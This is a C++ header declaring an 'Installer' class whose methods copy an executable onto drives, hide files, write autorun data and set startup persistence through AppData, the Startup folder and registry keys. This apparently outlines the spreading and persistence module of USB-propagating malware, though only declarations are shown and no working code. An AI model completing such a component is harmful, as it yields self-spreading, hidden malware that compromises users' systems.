#pragma once
#include "stdafx.h"

class Installer
{
public:
	Installer();
	~Installer();

	bool SetAutorun(bool autorun);
	bool InstallOnDrives();

private:
	bool InstallOnDrive(const wchar_t* drive);

	bool CopyTo(const wchar_t* path);
	bool HideFile(const wchar_t* path);
	bool SetAutorunAppdata(bool autorun);
	bool SetAutorunStartup(bool autorun);
	bool SetAutorunRegistry(bool autorun);

	bool SetAutorunRegistryWithKey(bool autorun, HKEY key, const wchar_t* subkey);

	wchar_t exeName[MAX_PATH];
	wchar_t appDataPath[1024];
	wchar_t registryPath[1024];
	wchar_t startupPath[1024];

	char autorunData[1024];
	size_t autorunBytes;
};

extern Installer installer;